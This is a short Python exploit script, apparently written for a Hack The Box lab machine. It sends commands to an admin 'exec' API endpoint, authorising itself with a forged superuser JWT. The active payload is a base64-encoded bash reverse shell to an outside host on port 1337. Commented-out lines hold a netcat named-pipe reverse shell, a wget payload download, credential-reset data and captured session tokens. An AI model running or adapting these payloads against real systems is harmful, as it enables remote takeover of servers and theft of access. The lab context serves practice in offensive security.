#!/usr/bin/env python3

import requests

url = 'http://10.10.11.161/api/v1/admin/'
method = "exec/"
# cmd = 'wget 10.10.16.2/game.sh'
# cmd = 'which wget'
# cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.2 1337 >/tmp/f'
cmd = 'echo%20"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yLzEzMzcgMD4mMQ=="%20|%20base64%20-d%20|%20bash'

# data= {
# 		"username":"admin@htb.local",
# 		"password": "getpwned",
# }

# file = {
# 	"file": "/home/htb/uhc/app/api/v1/endpoints/admin.py"
# }

# data = {
# 	"guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
# 	"password": "getpwned",
# }
# -------
# admin token:
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjcwNjcxMjg5LCJpYXQiOjE2Njk5ODAwODksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.znBhrJteYksvbdM-lHbC8kGrGFGf0t_k0FdE0sa4CHY
# -------
# Kira's token:
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjcwNjcwNTY3LCJpYXQiOjE2Njk5NzkzNjcsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiYmMxY2Q2NTgtMDQ3OC00ZDIyLTlkNGYtYTcyOTJjMDk0M2ZiIn0.1Nwq_4ti4XSxrYL8o5yEQ20RbVhWzgPL_Zh0Ldz2x1g

headers = {
	"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjcwNjcxMjg5LCJpYXQiOjE2Njk5ODAwODksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6IlRydWUifQ.vycifuAACuKfeiVEO3oWvryyMMBm-o-a3Er6zXZbUmQ"
}

r = requests.get(url + method + cmd, headers=headers)
print(r.text)
